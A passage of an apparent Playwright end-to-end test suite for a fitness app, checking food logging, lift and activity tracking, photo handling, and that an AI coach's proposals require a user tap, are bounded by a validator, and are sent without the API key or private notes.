    await page.getByRole('tab', { name: 'Ingredients' }).click();
    await page.getByLabel('Raw ingredients').fill('300 g rice\n2 tbsp oil');
    await page.getByLabel('Makes how many equal servings?').fill('4');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=one of 4 servings');
    eq(await page.getByLabel('Calories').inputValue(), '330');
    await page.getByRole('button', { name: 'Cancel' }).click();
    eq(await cnt(page, 'food_logged'), before, 'cancel saves nothing');
  });

  await step('Fuel: a malformed AI reply shows an error and offers manual entry; nothing is saved', async () => {
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async () => ({ body: textReply('I am sorry, I cannot help with that.') }));
    const before = await cnt(page, 'food_logged');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.getByLabel('What you ate').fill('mystery');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('.warnbox[role="alert"]');
    await page.getByRole('button', { name: 'Enter macros myself' }).click();
    eq(await page.getByLabel('What was it?').inputValue(), 'mystery');
    eq(await cnt(page, 'food_logged'), before);
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('Fuel: a rejected key shows the provider\'s message and asks for a new key, which is kept on this device', async () => {
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async () => ({ status: 401, error: 'invalid x-api-key' }));
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.getByLabel('What you ate').fill('toast');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=invalid x-api-key');
    await page.getByText('Your AI key needs updating').waitFor();
    eq(await page.evaluate(() => App.hasKey()), false, 'the rejected key is dropped');
    await page.getByLabel('New API key').fill('sk-ant-renewed-0000000000');
    await page.getByRole('button', { name: 'Save key' }).click();
    await page.waitForFunction(() => App.hasKey());
    eq(await page.evaluate(() => [App.keyState.source, App.keyState.bad]), ['device', null]);
    eq(await page.evaluate(() => App.hasRemembered('anthropic')), true);
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('Fuel: editing an entry changes the portion (not raw macros) and keeps it a single entry (old one voided)', async () => {
    const before = (await page.evaluate(() => Store.getState().foods.length));
    await page.locator('.foodrow', { hasText: 'Dal and rice' }).click();
    eq(await page.getByLabel('Calories').count(), 0, 'no raw calories field once something is logged');
    await page.getByLabel('Portion (x as logged)').fill('1.5');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForTimeout(300);
    eq(await page.evaluate(() => Store.getState().foods.length), before, 'still a single entry');
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.name, f.kcal, f.protein, f.carbs, f.fat, f.portion.amount], ['Dal and rice', 615, 30, 90, 15, 1.5]);
  });

  // ----- coach -----
  await step('Coach: proposals need a tap, out-of-bounds proposals are rejected, apply and undo work', async () => {
    await page.unroute('https://api.anthropic.com/**');
    let call = 0;
    await fakeAI(page, async (body) => {
      call++;
      const last = body.messages[body.messages.length - 1];
      const isResult = Array.isArray(last.content) && last.content.some((c) => c.type === 'tool_result');
      if (!isResult) return { body: toolReply('Trimming a little.', 'propose_macro_change', { kcal: 2900, reason: 'Weight is flat.' }) };
      return { body: textReply('Queued. Tap Apply when you are ready.') };
    });
    await route(page, '#/coach');
    const kcalBefore = await page.evaluate(() => Store.getState().plan.kcal);
    await page.getByLabel('Message').fill('should I change my calories?');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.proposal');
    eq(await page.evaluate(() => Store.getState().plan.kcal), kcalBefore, 'not applied without a tap');
    const target = kcalBefore + 100;
    eq(await page.evaluate(() => Store.getState().plan.kcal), kcalBefore);
    await page.getByRole('button', { name: 'Apply', exact: true }).click();
    await page.waitForSelector('text=Applied');
    const after = await page.evaluate(() => Store.getState().plan.kcal);
    ok(after !== kcalBefore, 'target changed after Apply (was ' + kcalBefore + ', now ' + after + ')');
    await page.getByRole('button', { name: 'Undo' }).click();
    await page.waitForTimeout(250);
    eq(await page.evaluate(() => Store.getState().plan.kcal), kcalBefore, 'undo restores');
    void target; void call;
  });

  await step('Coach: a model asking for a 2000 kcal jump is refused by the validator', async () => {
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async (body) => {
      const last = body.messages[body.messages.length - 1];
      const isResult = Array.isArray(last.content) && last.content.some((c) => c.type === 'tool_result');
      if (!isResult) return { body: toolReply('Big change!', 'propose_macro_change', { kcal: 5000, reason: 'yolo' }) };
      return { body: textReply('That was rejected.') };
    });
    const n = await page.locator('.proposal').count();
    await page.getByLabel('Message').fill('go extreme');
    await page.keyboard.press('Enter');
    await page.waitForSelector('text=That was rejected.');
    eq(await page.locator('.proposal').count(), n, 'no new proposal card');
  });

  await step('Coach request contains data but not the name or key', async () => {
    const reqs = [];
    await page.unroute('https://api.anthropic.com/**');
    await page.route('https://api.anthropic.com/**', async (r) => { if (r.request().method() === 'OPTIONS') return r.fulfill({ status: 204, headers: CORS }); reqs.push(r.request()); return r.fulfill({ status: 200, headers: Object.assign({ 'content-type': 'text/event-stream' }, CORS), body: textReply('fine') }); });
    await page.getByLabel('Message').fill('hello');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.msg.ai:has-text("fine")');
    const r = reqs[reqs.length - 1];
    ok(r.headers()['x-api-key'] === 'sk-ant-renewed-0000000000', 'key sent as header');
    ok(!(r.postData() || '').includes('sk-ant-renewed'), 'key must not be in the body');
    ok(/USER DATA/.test(r.postData()), 'context is included');
    ok(/foodToday/.test(r.postData()), 'today\'s food log is in the context');
  });

  await step('Coach: a photo can be attached to a message and is sent alongside the usual summary', async () => {
    await page.unroute('https://api.anthropic.com/**');
    const reqs2 = [];
    await page.route('https://api.anthropic.com/**', async (r) => { if (r.request().method() === 'OPTIONS') return r.fulfill({ status: 204, headers: CORS }); reqs2.push(JSON.parse(r.request().postData() || '{}')); return r.fulfill({ status: 200, headers: Object.assign({ 'content-type': 'text/event-stream' }, CORS), body: textReply('That looks like a solid squat depth.') }); });
    const png = await page.evaluate(async () => {
      const c = document.createElement('canvas'); c.width = 200; c.height = 200; const x = c.getContext('2d'); x.fillStyle = '#284'; x.fillRect(0, 0, 200, 200);
      const b = await new Promise((res) => c.toBlob(res, 'image/png'));
      return Array.from(new Uint8Array(await b.arrayBuffer()));
    });
    await page.getByLabel('Take or choose a photo').setInputFiles({ name: 'squat.png', mimeType: 'image/png', buffer: Buffer.from(png) });
    await page.waitForSelector('.attachprev:not(.hidden)');
    ok(/Photo attached/.test(await page.locator('.attachprev').innerText()), 'preview shown before sending');
    ok(/this photo/.test(await page.locator('.notice').innerText()), 'notice says the photo will go too');
    await page.getByLabel('Message').fill('does my squat depth look ok?');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.msg.ai:has-text("solid squat depth")');
    eq(reqs2.length, 1, 'one provider call');
    const content = reqs2[0].messages[reqs2[0].messages.length - 1].content;
    eq(content.filter((c) => c.type === 'image').length, 1, 'one image sent');
    ok(content.some((c) => c.type === 'image' && c.source.media_type === 'image/jpeg'), 'recompressed to JPEG');
    ok(/foodToday/.test(JSON.stringify(reqs2[0])), 'the usual data summary still goes too');
    eq(await page.locator('.msg.user img.msgimg').count(), 1, 'the sent photo shows in the chat');
    ok(await page.locator('.attachprev.hidden').count() >= 1, 'the attach preview clears after sending');
  });

  await step('no screen or sheet shows stray "null", "undefined" or "NaN"', async () => {
    const bad = /\b(null|undefined|NaN)\b/;
    for (const h of ['#/today', '#/lifts', '#/activity', '#/fuel', '#/progress', '#/photos', '#/coach', '#/coach/setup', '#/settings', '#/settings/plan']) {
      await route(page, h);
      const t = await page.locator('#screen').innerText();
      ok(!bad.test(t), h + ' shows: ' + (t.match(bad) || [])[0]);
    }
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    for (const tab of ['Find', 'Describe', 'Ingredients', 'Manual']) {
      await page.getByRole('tab', { name: tab }).click();
      ok(!bad.test(await page.locator('#sheets').innerText()), 'Add food / ' + tab);
    }
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('photos: upload is re-encoded as JPEG, stored locally, shown, replaced and deleted', async () => {
    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
    await route(page, '#/photos');
    await page.locator('input[aria-label="Choose a photo"]').waitFor({ state: 'attached' });
    await page.getByRole('button', { name: 'Add Front photo' }).click({ trial: true }).catch(() => {});
    const chooser = page.waitForEvent('filechooser');
    await page.getByRole('button', { name: 'Add Front photo' }).click();
    await (await chooser).setFiles({ name: 'front.png', mimeType: 'image/png', buffer: png });
    await page.waitForSelector('button.thumb[aria-label="Open Front photo"]');
    const m = await page.evaluate(async () => { const all = await Store.allMedia(); return all.map((x) => ({ type: x.type, size: x.size })); });
    eq(m.length, 1); eq(m[0].type, 'image/jpeg');
    eq(await cnt(page, 'photo_added'), 1);
    ok(await page.locator('button.thumb.blur').count() === 1, 'thumbnails are blurred by default');
    // a backup with photos carries them; one without does not
    const sizes = await page.evaluate(async () => { const a = JSON.parse(await Store.buildBackup({ media: true })); const b = JSON.parse(await Store.buildBackup({ media: false })); return [a.media.length, b.media.length]; });
    eq(sizes, [1, 0]);
    await page.locator('button.thumb[aria-label="Open Front photo"]').click();
    await page.locator('#sheets').getByRole('button', { name: 'Delete' }).click();
    await page.waitForTimeout(250);
    eq(await page.evaluate(async () => (await Store.allMedia()).length), 0, 'blob deleted with the entry');
  });

  await step('a non-image file is refused without storing anything', async () => {
    await route(page, '#/photos');
    const chooser = page.waitForEvent('filechooser');
    await page.getByRole('button', { name: 'Add Side photo' }).click();
    await (await chooser).setFiles({ name: 'notes.txt', mimeType: 'text/plain', buffer: Buffer.from('hello') });
    await page.waitForTimeout(400);
    eq(await page.evaluate(async () => (await Store.allMedia()).length), 0);
  });

  await step('add a lift after onboarding: it joins the plan and today\'s matching day', async () => {
    await route(page, '#/lifts');
    const before = await page.evaluate(() => Object.keys(Store.getState().plan.lifts).length);
    await page.getByRole('button', { name: 'Add a lift' }).click();
    await page.locator('#sheets').getByLabel('Lift', { exact: true }).selectOption('curl');
    await page.locator('#sheets').getByLabel(/Weight you can do/).fill('25');
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('10');
    await page.getByRole('button', { name: 'Add', exact: true }).click();
    await page.waitForTimeout(300);
    const st = await page.evaluate(() => { const p = Store.getState().plan; return { n: Object.keys(p.lifts).length, placed: p.workouts.some((w) => w.ex.some((e) => e.lift === 'curl')), t: Engine.liftTarget(p.lifts.curl, 1, { deloadWeeks: p.deloadWeeks }).kg / Engine.KG_PER_LB }; });
    eq(st.n, before + 1); ok(st.placed, 'on a workout day'); ok(st.t > 0, 'has a target');
  });

  await step('lifts: the picker offers every catalog lift and your own, with no cap of 13', async () => {
    await route(page, '#/lifts');
    // your own lift, placed on a session by muscle
    await page.getByRole('button', { name: 'Add a lift' }).click();
    const opts = await page.locator('#sheets').getByLabel('Lift', { exact: true }).locator('option').count();
    ok(opts >= 30, 'the picker lists the catalog, got ' + opts);
    await page.locator('#sheets').getByLabel('Lift', { exact: true }).selectOption('__custom');
    await page.locator('#sheets').getByLabel('Name', { exact: true }).fill('Trap bar deadlift');
    await page.locator('#sheets').getByLabel('Muscle', { exact: true }).selectOption('back');
    await page.locator('#sheets').getByLabel('Equipment', { exact: true }).selectOption('barbell');
    await page.locator('#sheets').getByLabel('Type of lift', { exact: true }).selectOption('heavy');
    await page.locator('#sheets').getByLabel(/Weight you can do/).fill('135');
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('5');
    await page.getByRole('button', { name: 'Add', exact: true }).click();
    await page.waitForTimeout(300);
    let st = await page.evaluate(() => { const p = Store.getState().plan; const l = p.lifts.c_trap_bar_deadlift_1; return { l: l && { name: l.name, equip: l.equip, cls: l.cls, n: l.blockKg.length, kg: Engine.liftTarget(l, 1, { deloadWeeks: p.deloadWeeks }).kg }, placed: p.workouts.filter((w) => w.ex.some((e) => e.lift === 'c_trap_bar_deadlift_1')).map((w) => w.focus) }; });
    ok(st.l && st.l.name === 'Trap bar deadlift' && st.l.n === 5 && st.l.kg > 0, 'custom lift built with a progression');
    eq(st.l.cls, 'heavy'); eq(st.placed.length, 1); ok(st.placed[0].includes('back'), 'placed on a back day');
    await page.waitForSelector('.liftcard:has-text("Trap bar deadlift")');
    // then well past 13 tracked lifts, all from the catalog
    for (const id of ['deadlift', 'rdl', 'overhead_press', 'barbell_row', 'hip_thrust', 'hack_squat', 'machine_press', 'hammer_curl', 'ez_curl', 'lateral_raise', 'face_pull', 'calf_raise']) {
      await page.getByRole('button', { name: 'Add a lift' }).click();
      await page.locator('#sheets').getByLabel('Lift', { exact: true }).selectOption(id);
      await page.locator('#sheets').getByLabel(/Weight you can do/).fill('60');
      await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('8');
      await page.getByRole('button', { name: 'Add', exact: true }).click();
      await page.waitForTimeout(120);
    }
    st = await page.evaluate(() => Object.keys(Store.getState().plan.lifts).length);
    ok(st >= 17, 'more than 13 lifts tracked, got ' + st);
    ok(await page.locator('.liftcard').count() >= 17, 'all of them listed');
    eq(await page.evaluate(() => Engine.validateEvents(Store.getEvents(), 1e6)), null, 'the log still validates');
  });

  await step('lifts: a lift can be placed on a chosen session, or on none', async () => {
    await route(page, '#/lifts');
    await page.getByRole('button', { name: 'Add a lift' }).click();
    await page.locator('#sheets').getByLabel('Lift', { exact: true }).selectOption('goblet_squat');
    await page.locator('#sheets').getByLabel(/Weight you can do/).fill('50');
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('10');
    await page.locator('#sheets').getByLabel('Goes on').selectOption('-');
    await page.getByRole('button', { name: 'Add', exact: true }).click();
    await page.waitForTimeout(250);
    const st = await page.evaluate(() => { const p = Store.getState().plan; return { tracked: !!p.lifts.goblet_squat, inSession: p.workouts.some((w) => w.ex.some((e) => e.lift === 'goblet_squat')) }; });
    ok(st.tracked && !st.inSession, 'tracked but in no session');
  });

  await step('lifts: stop tracking keeps the history and the exercise', async () => {
    await route(page, '#/lifts/c_trap_bar_deadlift_1');
    await page.getByRole('button', { name: 'Stop tracking this lift' }).click();
    await page.locator('#sheets').getByRole('button', { name: 'Stop tracking', exact: true }).click();
    await page.waitForFunction(() => !Store.getState().plan.lifts.c_trap_bar_deadlift_1);
    const st = await page.evaluate(() => Store.getState().plan.workouts.flatMap((w) => w.ex).filter((e) => e.n === 'Trap bar deadlift').map((e) => e.lift));
    eq(st, [null], 'kept as a plain exercise');
    ok((await page.evaluate(() => location.hash)) === '#/lifts', 'back on the list');
  });

  // ----- activity -----
  await step('activity: swimming with an estimated burn, tennis with your own number', async () => {
    await route(page, '#/activity');
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    const sh = page.locator('#sheets');
    await sh.getByLabel('Activity', { exact: true }).selectOption('swimming');
    await sh.getByLabel('How long').fill('45');
    const want = await page.evaluate(() => { const st = Store.getState(), t = Engine.isoDate(new Date()); return Engine.estimateKcal('swimming', 'moderate', 45, Engine.bodyKg(st, t)); });
    ok(want > 300 && want < 420, 'about (7 - 1) x 82 kg x 0.75 h: ' + want);
    const est = await sh.innerText();
    ok(est.includes('Estimated ~' + want + ' kcal'), 'estimate shown; sheet said: ' + est.split('\n').filter((l) => /stimat|Add how long/.test(l)).join(' / '));
    await sh.getByLabel('Note (optional)').fill('SECRET-NOTE-XYZ');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForFunction(() => Store.getState().workouts.length === 1);
    await route(page, '#/activity');
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    await sh.getByLabel('Activity', { exact: true }).selectOption('tennis');
    await sh.getByLabel('How long').fill('60');
    await sh.getByRole('radio', { name: 'Hard' }).click();
    await sh.getByLabel('Calories burnt').fill('550');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForFunction(() => Store.getState().workouts.length === 2);
    const w = await page.evaluate(() => Store.getState().workouts.map((x) => ({ type: x.type, mins: x.mins, kcal: x.kcal, manual: x.manual, effort: x.effort })));
    eq(w[0].kcal, want); eq(Object.assign({}, w[0], { kcal: 0 }), { type: 'swimming', mins: 45, kcal: 0, manual: false, effort: 'moderate' });
    eq(w[1], { type: 'tennis', mins: 60, kcal: 550, manual: true, effort: 'hard' });
  });

  await step('activity: your own sport, a past day, and no future dates', async () => {
    await route(page, '#/activity');
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    const sh = page.locator('#sheets');
    await sh.getByLabel('Activity', { exact: true }).selectOption('other');
    await sh.getByLabel('What was it?').fill('Kabaddi');
    await sh.getByLabel('How long').fill('30');
    const y = await page.evaluate(() => Engine.addDays(Engine.isoDate(new Date()), -1));
    await sh.getByLabel('Date').fill(y);
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForFunction(() => Store.getState().workouts.length === 3);
    const k = await page.evaluate(() => Store.getState().workouts.find((x) => x.label === 'Kabaddi'));
    ok(k && k.type === 'other' && k.kcal > 0, 'saved with an estimate');
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    await sh.getByLabel('Activity', { exact: true }).selectOption('yoga');
    await sh.getByLabel('How long').fill('20');
    const tomorrow = await page.evaluate(() => Engine.addDays(Engine.isoDate(new Date()), 1));
    await sh.getByLabel('Date').fill(tomorrow);
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    ok(/today or an earlier day/i.test(await page.locator('#toast').innerText()), 'future date refused');
    eq(await page.evaluate(() => Store.getState().workouts.length), 3);
    await sh.getByRole('button', { name: 'Cancel' }).click();
  });

  await step('activity: strength with sets and load counts towards the lift targets and the weekly plan', async () => {
    await route(page, '#/activity');
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    const sh = page.locator('#sheets');
    await sh.getByLabel('Activity', { exact: true }).selectOption('strength');
    const dflt = await sh.getByLabel('Which workout').inputValue();
    ok(dflt.length > 0, 'defaults to the session on for the day: ' + dflt);
    // pick the session with the most tracked lifts, so the sets show up in lift status
    const best = await page.evaluate(() => Store.getState().plan.workouts.map((w) => ({ n: w.name, k: w.ex.filter((e) => e.lift).length })).sort((a, b) => b.k - a.k)[0].n);
    await sh.getByLabel('Which workout').selectOption(best);
    await sh.getByRole('button', { name: 'Fill with the plan' }).click();
    await sh.getByLabel('How long').fill('55');
    const before = await cnt(page, 'set_logged');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    // the workout is written first, then its sets: the toast appears once everything is saved
    await page.getByText(/^Logged ~\d/).first().waitFor();
    const r = await page.evaluate(() => {
      const st = Store.getState(), plan = st.plan, t = Engine.isoDate(new Date());
      const w = st.workouts.find((x) => x.type === 'strength');
      const mine = st.sets.filter((x) => x.wo === w.id);
      const tracked = Object.keys(plan.lifts).find((id) => mine.some((x) => x.lift === id));
      const wk = Engine.weekOf(plan.startDate, t);
      return { session: w.session, n: mine.length, tracked, logged: tracked ? Engine.liftStatus(st, tracked, wk, t).logged : 0, kcal: w.kcal, done: Engine.weekPlan(st, wk, t).filter((p) => p.name === w.session).map((p) => p.done) };
    });
    ok(r.n >= 6, 'sets were written with the workout: ' + r.n);
    ok(r.tracked && r.logged >= 3, 'tracked lift sets show up in lift status');
    ok(r.kcal > 150, 'strength calories estimated: ' + r.kcal);
    ok(r.done.length && r.done.every(Boolean), 'the session is marked done in the weekly plan');
    eq((await events(page)).filter((e) => e.type === 'set_logged').length, before + r.n);
  });

  await step('activity: editing keeps the sets, deleting a strength workout removes them', async () => {
    await route(page, '#/activity');
    const beforeSets = await page.evaluate(() => Store.getState().sets.length);
    await page.locator('.listrow:has-text("Strength training")').first().click();
    const sh = page.locator('#sheets');
    ok(/sets are saved with this workout/.test(await sh.innerText()), 'linked sets noted');
    await sh.getByLabel('How long').fill('70');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForFunction(() => { const s = Store.getState().workouts.filter((w) => w.type === 'strength'); return s.length === 1 && s[0].mins === 70; }); // new copy written first, old one voided after
    eq(await page.evaluate(() => Store.getState().sets.length), beforeSets, 'edit leaves the sets alone');
    await route(page, '#/activity');
    await page.locator('.listrow:has-text("Strength training")').first().click();
    await page.locator('#sheets').getByRole('button', { name: 'Delete with sets' }).click();
    await page.waitForFunction(() => !Store.getState().workouts.some((w) => w.type === 'strength'));
    const st = await page.evaluate(() => ({ sets: Store.getState().sets.length, linked: Store.getState().sets.filter((x) => x.wo).length }));
    eq(st.linked, 0); ok(st.sets < beforeSets, 'the workout\'s sets are gone');
  });

  await step('activity: "This week" lists each planned day, and tapping one previews its exercises', async () => {
    await route(page, '#/activity');
    const rows = page.locator('.card', { hasText: 'This week' }).locator('.listrow');
    const n = await rows.count();
    ok(n > 0, 'at least one planned day shows this week');
    await rows.first().click();
    await page.waitForSelector('.sheet-title');
    const sheetText = await page.locator('#sheets').innerText();
    ok(/Targets shown are for week \d+ of the plan/.test(sheetText), 'shows the week-targets note');
    ok(/exercise/.test(sheetText), 'lists how many exercises');
    // no raw macro/logging fields here: it is a read-only look at what the day involves
    eq(await page.locator('#sheets').getByLabel('Calories').count(), 0);
    await page.locator('#sheets').getByRole('button', { name: 'Close' }).click();
  });

  await step('activity: an optional photo can be attached to a workout, previewed in History, and removed', async () => {
    await route(page, '#/activity');
    await page.getByRole('button', { name: 'Log a workout' }).first().click();
    const sh = page.locator('#sheets');
    await sh.getByLabel('Activity', { exact: true }).selectOption('swimming');
    await sh.getByLabel('How long').fill('30');
    const png = await page.evaluate(async () => {
      const c = document.createElement('canvas'); c.width = 200; c.height = 200; const x = c.getContext('2d'); x.fillStyle = '#2a5'; x.fillRect(0, 0, 200, 200);
      const b = await new Promise((res) => c.toBlob(res, 'image/png'));
      return Array.from(new Uint8Array(await b.arrayBuffer()));
    });
    await sh.getByLabel('Choose a photo for this workout').setInputFiles({ name: 'pool.png', mimeType: 'image/png', buffer: Buffer.from(png) });
    await page.waitForSelector('.attachprev:not(.hidden)');
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.getByText(/^Logged ~\d/).first().waitFor();
    const w = await page.evaluate(() => Store.getState().workouts.filter((x) => x.type === 'swimming').pop());
    ok(w.photo && w.photo.thumb && w.photo.full, 'photo ids saved on the workout');
    const media = await page.evaluate(async (ids) => {
      const t = await Store.getMedia(ids[0]), f = await Store.getMedia(ids[1]);
      return { hasT: !!t, hasF: !!f, type: t && t.type, tk: t && t.kind, fk: f && f.kind };
    }, [w.photo.thumb, w.photo.full]);
    ok(media.hasT && media.hasF, 'both compressed copies are stored');
    eq([media.tk, media.fk], ['thumb', 'full']);
    eq(media.type, 'image/jpeg', 'recompressed to JPEG, stripping any metadata');
    await route(page, '#/activity');
    await page.locator('.card', { hasText: 'History' }).locator('img.attachthumb').first().waitFor();
    await page.locator('.card', { hasText: 'History' }).locator('.listrow').first().click();
    await sh.getByRole('button', { name: 'Remove photo' }).click();
    await sh.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForTimeout(300);
    const w2 = await page.evaluate((id) => Store.getState().workouts.find((x) => x.id === id), w.id);
    eq(w2.photo, null, 'the photo is off the workout');
    const gone = await page.evaluate(async (ids) => { const t = await Store.getMedia(ids[0]), f = await Store.getMedia(ids[1]); return !t && !f; }, [w.photo.thumb, w.photo.full]);
    ok(gone, 'the stored copies are deleted, not left orphaned');
  });

  await step('activity: streaks count active days and weeks, and show on Today, Progress and Activity', async () => {
    const sum = await page.evaluate(() => Engine.activitySummary(Store.getState(), Engine.isoDate(new Date()), 3));
    ok(sum.dayStreak >= 2, 'today and yesterday are active: ' + sum.dayStreak);
    ok(sum.thisWeek.kcal >= 300 + 550, 'week calories add up');
    for (const [hash, text] of [['#/today', 'Activity'], ['#/progress', 'Activity'], ['#/activity', 'Weekly log']]) {
      await route(page, hash);
      const t = await page.locator('#screen').innerText();
      ok(t.includes(text) && /day streak/.test(t) && /week streak/.test(t), hash + ' shows the streaks');
    }
    await route(page, '#/activity');
    eq(await page.locator('.dot').count(), 14, 'fourteen days shown');
    ok(await page.locator('.dot.on').count() >= 2, 'active days lit');
    await route(page, '#/fuel');
    ok(/Active today/.test(await page.locator('#screen').innerText()), 'Fuel mentions active calories');
  });

  await step('today: the suggested session can be moved, swapped or skipped, and it is not a miss', async () => {
    await route(page, '#/today');
    const t0 = await page.evaluate(() => { const st = Store.getState(); return { today: Engine.isoDate(new Date()), name: Engine.sessionFor(st.plan, st.moves, Engine.isoDate(new Date())).session.name }; });
    await page.locator('.card', { hasText: t0.name + ' day' }).getByRole('button', { name: 'Change' }).click();
    const sh = page.locator('#sheets');
    ok(/Move .* to another day/.test(await sh.innerText()), 'move options');
    ok(/suggestion/i.test(await sh.innerText()), 'says it is only a suggestion');
    await sh.locator('.list').first().locator('.listrow').first().click();
    await page.waitForFunction((d) => Store.getState().moves[d] !== undefined, t0.today);
    const mv = await page.evaluate(() => { const st = Store.getState(); return Object.assign({}, st.moves); });
    ok(Object.keys(mv).length === 2, 'two days changed: ' + JSON.stringify(mv));
    const after = await page.evaluate(() => { const st = Store.getState(), t = Engine.isoDate(new Date()); const f = Engine.sessionFor(st.plan, st.moves, t); return { session: f.session && f.session.name, moved: f.moved }; });
    ok(after.moved, 'today differs from the plan now');
    await route(page, '#/today');
    if (after.session) ok((await page.locator('#screen').innerText()).includes('moved here'), 'the card says it moved here');
    else ok((await page.locator('#screen').innerText()).includes('Rest day'), 'a rest day now');
  });

  await step('today: on a rest day, train anyway pulls a session forward; skipping a session drops it without a miss', async () => {
    await page.evaluate(() => { const st = Store.getState(), t = Engine.isoDate(new Date()); window.__rest = !Engine.sessionFor(st.plan, st.moves, t).session; });
    if (!(await page.evaluate(() => window.__rest))) {
      await route(page, '#/today');
      await page.getByRole('button', { name: 'Change' }).first().click();
      await page.locator('#sheets').getByRole('button', { name: /Skip it this week/ }).click();
      await page.waitForFunction(() => { const st = Store.getState(); return !Engine.sessionFor(st.plan, st.moves, Engine.isoDate(new Date())).session; });
    }
    await route(page, '#/today');
    ok((await page.locator('#screen').innerText()).includes('Rest day'), 'rest day card');
    await page.getByRole('button', { name: 'Train anyway' }).click();
    const sh = page.locator('#sheets');
    ok(/Train today\?/.test(await sh.innerText()), 'sheet asks which session');
    const name = await sh.locator('.listrow b').first().innerText();
    ok(/Planned .*cleared|Done this week|Not on this week/.test(await sh.locator('.listrow').first().innerText()), 'each option says what it does to the week: ' + (await sh.locator('.listrow').first().innerText()).replace(/\n/g, ' '));
    await sh.locator('.listrow').first().click();
    await page.waitForFunction((n) => { const st = Store.getState(); const s = Engine.sessionFor(st.plan, st.moves, Engine.isoDate(new Date())).session; return s && s.name === n; }, name);
    await route(page, '#/today');
    ok((await page.locator('#screen').innerText()).includes(name + ' day'), 'today shows the chosen session');
  });

  await step('today: "See what\'s coming up" always answers "what is tomorrow", not just a name', async () => {
    await route(page, '#/today');
    await page.getByRole('button', { name: /coming up/i }).first().click();
    let overlay = page.locator('.overlay').last();
    await overlay.locator('.sheet-title', { hasText: 'Coming up' }).waitFor();
    const dayRows = overlay.locator('.listrow'), restRows = overlay.locator('.kv');
    eq((await dayRows.count()) + (await restRows.count()), 7, 'the next 7 days are listed, planned or rest');
    ok((await dayRows.count()) > 0, 'at least one planned day ahead');
    const label = (await dayRows.first().locator('b').innerText()).trim();
    await dayRows.first().click();
    overlay = page.locator('.overlay').last();
    await overlay.locator('.sheet-title', { hasText: label + ' day' }).waitFor();
    const detail = await overlay.innerText();
    ok(/Targets shown are for week \d+ of the plan/.test(detail), 'not just the name: shows exercises and targets');
    await overlay.getByRole('button', { name: 'Close' }).click();
    await page.locator('.overlay').last().getByRole('button', { name: 'Close' }).click();
  });

  await step('coach: gets an activity summary without notes; a workout proposal needs a tap and undo works', async () => {
    await page.unroute('https://api.anthropic.com/**');
    const reqs = [];
    await page.route('https://api.anthropic.com/**', async (r) => {
      if (r.request().method() === 'OPTIONS') return r.fulfill({ status: 204, headers: CORS });
      const body = JSON.parse(r.request().postData() || '{}'); reqs.push(body);
      const last = body.messages[body.messages.length - 1];
      const isResult = Array.isArray(last.content) && last.content.some((c) => c.type === 'tool_result');
      const out = isResult ? textReply('Queued. Tap Apply.') : toolReply('Logging that.', 'log_workout', { activity: 'badminton', minutes: 40, effort: 'hard' });
      return r.fulfill({ status: 200, headers: Object.assign({ 'content-type': 'text/event-stream' }, CORS), body: out });
    });
    await route(page, '#/coach');
    const n0 = await page.evaluate(() => Store.getState().workouts.length);
    await page.getByLabel('Message').fill('I played badminton for 40 minutes, hard');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.proposal');
    eq(await page.evaluate(() => Store.getState().workouts.length), n0, 'nothing logged without a tap');
    const sys = JSON.stringify(reqs[0].system || '') + JSON.stringify(reqs[0].messages);
    ok(/"activity":\{/.test(sys.replace(/\\"/g, '"')), 'activity block sent');
    ok(/Swimming/.test(sys) && /Tennis/.test(sys), 'activities named');
    ok(!/SECRET-NOTE-XYZ/.test(sys), 'workout notes are never sent');
    ok(/NOT a miss/.test(sys), 'the prompt says moved sessions are not misses');
    await page.getByRole('button', { name: 'Apply', exact: true }).click();
    await page.waitForFunction((n) => Store.getState().workouts.length === n + 1, n0);
    const w = await page.evaluate(() => Store.getState().workouts.find((x) => x.type === 'badminton'));
    ok(w && w.mins === 40 && w.effort === 'hard' && w.kcal > 200 && !w.manual, 'estimated: ' + JSON.stringify(w));
    await page.getByRole('button', { name: 'Undo' }).click();
    await page.waitForFunction((n) => Store.getState().workouts.length === n, n0);
  });

  await step('coach: a workout with nonsense values is rejected by the validator', async () => {
    await page.unroute('https://api.anthropic.com/**');
